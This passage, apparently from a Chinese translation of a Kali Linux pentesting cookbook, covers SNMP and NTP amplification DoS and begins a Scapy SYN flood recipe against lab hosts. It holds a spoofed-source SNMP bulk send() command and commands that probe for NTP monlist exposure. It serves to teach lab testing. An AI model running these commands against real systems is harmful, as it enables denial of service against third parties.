+<pre><code>&gt;&gt;&gt; send(IP(dst=&quot;172.16.36.134&quot;,src=&quot;172.16.36.135&quot;)/ UDP(sport=161,dport=161)/SNMP(PDU=SNMPbulk(max_repetitions=50,varbindlist =[SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarbind(oid=ASN1_OID(&apos;1. 3.6.1.2.1.19.1.3&apos;))])),verbose=1,count=2) 
+. 
+Sent 2 packets.
+</code></pre><p><code>send()</code>&#x51FD;&#x6570;&#x5E94;&#x8BE5;&#x7528;&#x4E8E;&#x53D1;&#x9001;&#x8FD9;&#x4E9B;&#x4F2A;&#x9020;&#x8BF7;&#x6C42;&#xFF0C;&#x56E0;&#x4E3A;&#x54CD;&#x5E94;&#x8FD4;&#x56DE;&#x9884;&#x671F;&#x4E0D;&#x4F1A;&#x7ED9;&#x672C;&#x5730;&#x63A5;&#x53E3;&#x3002; &#x8981;&#x786E;&#x8BA4;&#x8F7D;&#x8377;&#x662F;&#x5426;&#x5230;&#x8FBE;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; TCPdump &#x6355;&#x83B7;&#x4F20;&#x5165;&#x6D41;&#x91CF;&#xFF1A;</p>
+<pre><code>admin@ubuntu:~$ sudo tcpdump -i eth0 -vv src 172.16.36.134 
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 
+13:32:14.210732 IP (tos 0x0, ttl 128, id 5944, offset 0, flags [+], proto UDP (17), length 1500) 172.16.36.134.snmp &gt; 172.16.36.135.snmp:  [len1468&lt;asnlen2150] 
+13:32:14.210732 IP (tos 0x0, ttl 128, id 5944, offset 1480, flags [none], proto UDP (17), length 702) 172.16.36.134 &gt; 172.16.36.135: udp
+13:32:35.133384 IP (tos 0x0, ttl 128, id 8209, offset 0, flags [+], proto UDP (17), length 1500) 172.16.36.134.snmp &gt; 172.16.36.135.snmp:  [len1468&lt;asnlen2150] 
+13:32:35.133384 IP (tos 0x0, ttl 128, id 8209, offset 1480, flags [none], proto UDP (17), length 702) 172.16.36.134 &gt; 172.16.36.135: udp
+
+4 packets captured 
+4 packets received by filter 
+0 packets dropped by kernel
+</code></pre><p>&#x5728;&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;TCPdump &#x914D;&#x7F6E;&#x4E3A;&#x6355;&#x83B7;<code>eth0</code>&#x63A5;&#x53E3;&#x4E0A;&#xFF0C;&#x6765;&#x81EA;&#x6E90;IP&#x5730;&#x5740;<code>172.16.36.134</code>&#xFF08;SNMP &#x4E3B;&#x673A;&#x7684;IP&#x5730;&#x5740;&#xFF09;&#x7684;&#x6D41;&#x91CF;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x539F;&#x7406;&#x662F;&#x5229;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x8BBE;&#x5907;&#xFF0C;&#x4F7F;&#x7F51;&#x7EDC;&#x6D41;&#x91CF;&#x538B;&#x5012;&#x76EE;&#x6807;&#x3002; &#x5BF9;&#x4E8E;&#x591A;&#x6570;&#x653E;&#x5927;&#x653B;&#x51FB;&#xFF0C;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&#x7528;&#x4E8E;&#x6267;&#x884C;&#x653B;&#x51FB;&#x7684;&#x534F;&#x8BAE;&#x4E0D;&#x9A8C;&#x8BC1;&#x8BF7;&#x6C42;&#x6E90;</li>
+<li>&#x6765;&#x81EA;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x7F51;&#x7EDC;&#x529F;&#x80FD;&#x7684;&#x54CD;&#x5E94;&#x5E94;&#x8BE5;&#x663E;&#x7740;&#x5927;&#x4E8E;&#x7528;&#x4E8E;&#x8BF7;&#x6C42;&#x5B83;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>
+</ul>
+<p>SNMP &#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x53D6;&#x51B3;&#x4E8E; SNMP &#x67E5;&#x8BE2;&#x7684;&#x54CD;&#x5E94;&#x5927;&#x5C0F;&#x3002; &#x53E6;&#x5916;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x591A;&#x4E2A; SNMP &#x670D;&#x52A1;&#x5668;&#x6765;&#x589E;&#x52A0;&#x653B;&#x51FB;&#x7684;&#x5A01;&#x529B;&#x3002;</p>
+<h2 id="66-ntp-&#x653E;&#x5927;-dos-&#x653B;&#x51FB;">6.6 NTP &#x653E;&#x5927; DoS &#x653B;&#x51FB;</h2>
+<p>NTP &#x653E;&#x5927; DoS &#x653B;&#x51FB;&#x5229;&#x7528;&#x54CD;&#x5E94;&#x8FDC;&#x7A0B; monlist &#x8BF7;&#x6C42;&#x7684;&#x7F51;&#x7EDC;&#x65F6;&#x95F4;&#x534F;&#x8BAE;&#xFF08;NTP&#xFF09;&#x670D;&#x52A1;&#x5668;&#x3002; monlist &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x4E92;&#x7684;&#x6240;&#x6709;&#x8BBE;&#x5907;&#x7684;&#x5217;&#x8868;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#x6700;&#x591A;&#x8FBE; 600 &#x4E2A;&#x5217;&#x8868;&#x3002; &#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x4F2A;&#x9020;&#x6765;&#x81EA;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x4E3A;&#x6BCF;&#x4E2A;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x8FD4;&#x56DE;&#x975E;&#x5E38;&#x5927;&#x7684;&#x54CD;&#x5E94;&#x3002; &#x5728;&#x5199;&#x8FD9;&#x672C;&#x4E66;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4ECD;&#x7136;&#x662F;&#x4E00;&#x4E2A;&#x5E38;&#x89C1;&#x7684;&#x5A01;&#x80C1;&#xFF0C;&#x76EE;&#x524D;&#x6B63;&#x5728;&#x5927;&#x89C4;&#x6A21;&#x4F7F;&#x7528;&#x3002; &#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x5C06;&#x4EC5;&#x6F14;&#x793A;&#x5982;&#x4F55;&#x6D4B;&#x8BD5; NTP &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4EE5;&#x786E;&#x5B9A;&#x5B83;&#x4EEC;&#x662F;&#x5426;&#x5C06;&#x54CD;&#x5E94;&#x8FDC;&#x7A0B; monlist &#x8BF7;&#x6C42;&#x3002; &#x8865;&#x4E01;&#x7A0B;&#x5E8F;&#x53EF;&#x7528;&#x4E8E;&#x5927;&#x591A;&#x6570; NTP &#x670D;&#x52A1;&#x6765;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x4E14;&#x4EFB;&#x4F55;&#x6709;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x8BBE;&#x5907;&#x5E94;&#x8BE5;&#x4FEE;&#x590D;&#x6216;&#x4E0B;&#x7EBF;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x786E;&#x5B9A;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x5229;&#x7528; NTP &#x670D;&#x52A1;&#x5668;&#x6267;&#x884C; NTP &#x653E;&#x5927;&#x653B;&#x51FB;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x542F;&#x7528; NTP &#x7684;&#x8BBE;&#x5907;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;Ubuntu &#x7528;&#x4E8E;&#x6258;&#x7BA1; NTP &#x670D;&#x52A1;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Ubuntu &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Ubuntu Server&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E3A;&#x4E86;&#x786E;&#x5B9A;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x662F;&#x5426;&#x8FD0;&#x884C; NTP &#x670D;&#x52A1;&#xFF0C;Nmap &#x53EF;&#x7528;&#x4E8E;&#x5FEB;&#x901F;&#x626B;&#x63CF; UDP &#x7AEF;&#x53E3; 123&#x3002; <code>-sU</code>&#x9009;&#x9879;&#x53EF;&#x7528;&#x4E8E;&#x6307;&#x5B9A; UDP&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4F7F;&#x7528;<code>-p</code>&#x9009;&#x9879;&#x6765;&#x6307;&#x5B9A;&#x7AEF;&#x53E3; &#xFF1A;</p>
+<pre><code>root@KaliLinux:~# nmap -sU 172.16.36.224 -p 123
+
+Starting Nmap 6.25 ( http://nmap.org ) at 2014-02-24 18:12 EST 
+Nmap scan report for 172.16.36.224 
+Host is up (0.00068s latency). 
+PORT    STATE SERVICE 
+123/udp open  ntp 
+MAC Address: 00:0C:29:09:C3:79 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
+</code></pre><p>&#x5982;&#x679C;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8FD0;&#x884C; NTP &#x670D;&#x52A1;&#xFF0C;&#x5219;&#x626B;&#x63CF;&#x5E94;&#x8FD4;&#x56DE;&#x6253;&#x5F00;&#x72B6;&#x6001;&#x3002; Kali Linux &#x4E0A;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x5DE5;&#x5177;&#x53EF;&#x7528;&#x4E8E;&#x786E;&#x5B9A; NTP &#x670D;&#x52A1;&#x662F;&#x5426;&#x53EF;&#x7528;&#x4E8E;&#x653E;&#x5927;&#x653B;&#x51FB;&#x3002; NTPDC &#x5DE5;&#x5177;&#x53EF;&#x7528;&#x4E8E;&#x5C1D;&#x8BD5;&#x5BF9;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x6267;&#x884C; monlist &#x547D;&#x4EE4;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ntpdc -n -c monlist 172.16.36.224 
+172.16.36.224: timed out, nothing received 
+***Request timed out
+</code></pre><p>&#x7406;&#x60F3;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x770B;&#x5230;&#x7684;&#x662F;&#x6CA1;&#x6709;&#x54CD;&#x5E94;&#x8FD4;&#x56DE;&#x3002; &#x5728;&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x8BF7;&#x6C42;&#x8D85;&#x65F6;&#xFF0C;&#x5E76;&#x4E14;&#x672A;&#x63A5;&#x6536;&#x5230;&#x8F93;&#x51FA;&#x3002; &#x8FD9;&#x8868;&#x660E;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x6613;&#x53D7;&#x653B;&#x51FB;&#xFF0C;&#x5E76;&#x4E14; monlist &#x547D;&#x4EE4;&#x53EA;&#x80FD;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ntpdc -c monlist 172.16.36.3 
+remote address          port local address      count m ver rstr avgint  lstint
+========================================================================= ====== 
+host.crossing.com        123 172.16.36.3           18 4 4    1d0     35       1 
+grub.ca.us.roller.o      123 172.16.36.3           17 4 4    1d0     37      35 
+va-time.utility.o        123 172.16.36.3           17 4 4    1d0     37      59 
+cheezpuff.meatball.n     123 172.16.36.3           17 4 4    1d0     38      62 
+pwnbox.lizard.com        123 172.16.36.3           35 4 4    5d0     65      51
+</code></pre><p>&#x6216;&#x8005;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x7CFB;&#x5217;&#x4E3B;&#x673A;&#x548C;&#x8FDE;&#x63A5;&#x5143;&#x6570;&#x636E;&#xFF0C;&#x5219;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x80FD;&#x80FD;&#x591F;&#x7528;&#x4E8E;&#x653E;&#x5927;&#x653B;&#x51FB;&#x3002; &#x5BF9;&#x4E8E;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x4E92;&#x7684;&#x6BCF;&#x4E2A;&#x65B0;&#x4E3B;&#x673A;&#xFF0C;&#x4F1A;&#x5728;&#x6B64;&#x5217;&#x8868;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x6761;&#x76EE;&#xFF0C;&#x54CD;&#x5E94;&#x7684;&#x5927;&#x5C0F;&#x4EE5;&#x53CA;&#x53EF;&#x80FD;&#x7684;&#x8F7D;&#x8377;&#x4F1A;&#x53D8;&#x5F97;&#x66F4;&#x5927;&#x3002;</p>
+<p>&#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x539F;&#x7406;&#x662F;&#x5229;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x8BBE;&#x5907;&#xFF0C;&#x4F7F;&#x7F51;&#x7EDC;&#x6D41;&#x91CF;&#x538B;&#x5012;&#x76EE;&#x6807;&#x3002; &#x5BF9;&#x4E8E;&#x591A;&#x6570;&#x653E;&#x5927;&#x653B;&#x51FB;&#xFF0C;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&#x7528;&#x4E8E;&#x6267;&#x884C;&#x653B;&#x51FB;&#x7684;&#x534F;&#x8BAE;&#x4E0D;&#x9A8C;&#x8BC1;&#x8BF7;&#x6C42;&#x6E90;</li>
+<li>&#x6765;&#x81EA;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x7F51;&#x7EDC;&#x529F;&#x80FD;&#x7684;&#x54CD;&#x5E94;&#x5E94;&#x8BE5;&#x663E;&#x7740;&#x5927;&#x4E8E;&#x7528;&#x4E8E;&#x8BF7;&#x6C42;&#x5B83;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>
+</ul>
+<p>NTP  &#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x53D6;&#x51B3;&#x4E8E; NTP  &#x67E5;&#x8BE2;&#x7684;&#x54CD;&#x5E94;&#x5927;&#x5C0F;&#x3002; &#x53E6;&#x5916;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x591A;&#x4E2A; NTP  &#x670D;&#x52A1;&#x5668;&#x6765;&#x589E;&#x52A0;&#x653B;&#x51FB;&#x7684;&#x5A01;&#x529B;&#x3002;</p>
+<h2 id="67-syn-&#x6CDB;&#x6D2A;-dos-&#x653B;&#x51FB;">6.7 SYN &#x6CDB;&#x6D2A; DoS &#x653B;&#x51FB;</h2>
+<p>SYN &#x6CDB;&#x6D2A; DoS&#x653B;&#x51FB;&#x662F;&#x4E00;&#x79CD;&#x8D44;&#x6E90;&#x6D88;&#x8017;&#x653B;&#x51FB;&#x3002; &#x5B83;&#x7684;&#x539F;&#x7406;&#x662F;&#x5411;&#x4F5C;&#x4E3A;&#x653B;&#x51FB;&#x76EE;&#x6807;&#x7684;&#x670D;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x8FDC;&#x7A0B;&#x7AEF;&#x53E3;&#x53D1;&#x9001;&#x5927;&#x91CF; TCP SYN &#x8BF7;&#x6C42;&#x3002; &#x5BF9;&#x4E8E;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x63A5;&#x6536;&#x7684;&#x6BCF;&#x4E2A;&#x521D;&#x59CB; SYN &#x5206;&#x7EC4;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x53D1;&#x9001;&#x51FA; SYN + ACK &#x5206;&#x7EC4;&#x5E76;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x6253;&#x5F00;&#xFF0C;&#x6765;&#x7B49;&#x5F85;&#x6765;&#x81EA;&#x53D1;&#x8D77;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6700;&#x7EC8; ACK &#x5206;&#x7EC4;&#x3002; &#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x534A;&#x5F00;&#x8BF7;&#x6C42;&#x4F7F;&#x76EE;&#x6807;&#x8FC7;&#x8F7D;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x670D;&#x52A1;&#x65E0;&#x54CD;&#x5E94;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7528; Scapy &#x5BF9;&#x76EE;&#x6807;&#x6267;&#x884C;&#x5B8C;&#x6574;&#x7684; SYN &#x6CDB;&#x6D2A;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x8FD0;&#x884C; TCP &#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x8FDC;&#x7A0B;&#x7CFB;&#x7EDF;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4F7F;&#x7528; Metasploitable2 &#x7684;&#x5B9E;&#x4F8B;&#x7528;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Metasploitable2 &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Metasploitable2&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7528; Scapy &#x6267;&#x884C; SYN &#x6CDB;&#x6D2A;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4E0E;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5173;&#x8054;&#x7684;&#x7AEF;&#x53E3;&#x53D1;&#x9001; TCP SYN &#x8BF7;&#x6C42;&#x6765;&#x5F00;&#x59CB;&#x3002; &#x4E3A;&#x4E86;&#x5411;&#x4EFB;&#x4F55;&#x7ED9;&#x5B9A;&#x7AEF;&#x53E3;&#x53D1;&#x9001; TCP SYN &#x8BF7;&#x6C42;&#xFF0C;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x9996;&#x5148;&#x6784;&#x5EFA;&#x6B64;&#x8BF7;&#x6C42;&#x7684;&#x5C42;&#x7EA7;&#x3002; &#x6211;&#x4EEC;&#x5C06;&#x9700;&#x8981;&#x6784;&#x5EFA;&#x7684;&#x7B2C;&#x4E00;&#x5C42;&#x662F; IP &#x5C42;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
+&gt;&gt;&gt; i = IP() 
+&gt;&gt;&gt; i.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 127.0.0.1
+  dst= 127.0.0.1
+  \options\ 
+&gt;&gt;&gt; i.dst = &quot;172.16.36.135&quot;
+&gt;&gt;&gt; i.display()
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 172.16.36.224
+  dst= 172.16.36.135
+  \options\
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5C06; <code>IP</code> &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x53D8;&#x91CF;<code>i</code>&#x3002; &#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x8BE5;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x914D;&#x7F6E;&#x3002; &#x901A;&#x5E38;&#xFF0C;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x5730;&#x5740;&#x90FD;&#x8BBE;&#x4E3A;&#x56DE;&#x9001;&#x5730;&#x5740;<code>127.0.0.1</code>&#x3002; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06;<code>i.dst</code>&#x8BBE;&#x7F6E;&#x4E3A;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x503C;&#xFF0C;&#x6765;&#x66F4;&#x6539;&#x76EE;&#x6807;&#x5730;&#x5740;&#x5E76;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;&#x503C;&#x3002; &#x901A;&#x8FC7;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4E0D;&#x4EC5;&#x66F4;&#x65B0;&#x4E86;&#x76EE;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x800C;&#x4E14;<code>Scapy</code>&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x6E90; IP &#x5730;&#x5740;&#x66F4;&#x65B0;&#x4E3A;&#x4E0E;&#x9ED8;&#x8BA4;&#x63A5;&#x53E3;&#x76F8;&#x5173;&#x7684;&#x5730;&#x5740;&#x3002; &#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x7EE7;&#x7EED;&#x6784;&#x5EFA; TCP &#x5C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; t = TCP() 
+&gt;&gt;&gt; t.display() 
+###[ TCP ]###
+  sport= ftp_data
+  dport= http
+  seq= 0
+  ack= 0
+  dataofs= None
+  reserved= 0
+  flags= S
+  window= 8192
+  chksum= None
+  urgptr= 0
+  options= {}
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; TCP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E; IP &#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;<code>TCP</code> &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x4E86;<code>t</code>&#x53D8;&#x91CF;&#x3002; &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x786E;&#x5B9A;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x76EE;&#x6807;&#x7AEF;&#x53E3;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x662F; HTTP 80 &#x7AEF;&#x53E3;&#x3002;&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x7684;&#x9996;&#x6B21;&#x626B;&#x63CF;&#xFF0C;&#x6211;&#x4EEC;&#x5C06; TCP &#x914D;&#x7F6E;&#x4FDD;&#x7559;&#x9ED8;&#x8BA4;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x6784;&#x5EFA;&#x4E86; IP &#x548C; TCP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5806;&#x53E0;&#x8FD9;&#x4E9B;&#x5C42;&#x6765;&#x6784;&#x9020;&#x8BF7;&#x6C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; response = sr1(i/t,verbose=1,timeout=3) 
+Begin emission: 
+Finished to send 1 packets.
+Received 5 packets, got 1 answers, remaining 0 packets 
+&gt;&gt;&gt; response.display() 
+###[ IP ]###
+  version= 4L
+  ihl= 5L
+  tos= 0x0
+  len= 44
+  id= 0
+  flags= DF
+  frag= 0L
+  ttl= 64
+  proto= tcp
+  chksum= 0x9944
+  src= 172.16.36.135
+  dst= 172.16.36.224
+  \options\ 
+###[ TCP ]###
+     sport= http
+     dport= ftp_data
+     seq= 3651201360L
+     ack= 1
+     dataofs= 6L
+     reserved= 0L
+     flags= SA
+     window= 5840
+     chksum= 0x1c68
+     urgptr= 0
+     options= [(&apos;MSS&apos;, 1460)] 
+ ###[ Padding ]###
+        load= &apos;\x00\x00&apos;
+</code></pre><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x5206;&#x9694;&#x53D8;&#x91CF;&#x6765;&#x5806;&#x53E0; IP &#x548C; TCP &#x5C42;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x5C42;&#x8D4B;&#x7ED9;&#x8868;&#x793A;&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x65B0;&#x53D8;&#x91CF;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x67E5;&#x770B;&#x8BF7;&#x6C42;&#x7684;&#x914D;&#x7F6E;&#x3002; &#x4E00;&#x65E6;&#x5EFA;&#x7ACB;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x4F20;&#x9012;&#x7ED9;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x51FD;&#x6570;&#xFF0C;&#x4EE5;&#x4FBF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5206;&#x6790;&#x54CD;&#x5E94;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; request = (i/t) 
+&gt;&gt;&gt; request.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= tcp
+  chksum= None
+  src= 172.16.36.224
+  dst= 172.16.36.135
+  \options\ 
+###[ TCP ]###
+     sport= ftp_data
+     dport= http
+     seq= 0
+     ack= 0
+     dataofs= None
+     reserved= 0
+     flags= S
+     window= 8192
+     chksum= None
+     urgptr= 0
+     options= {}
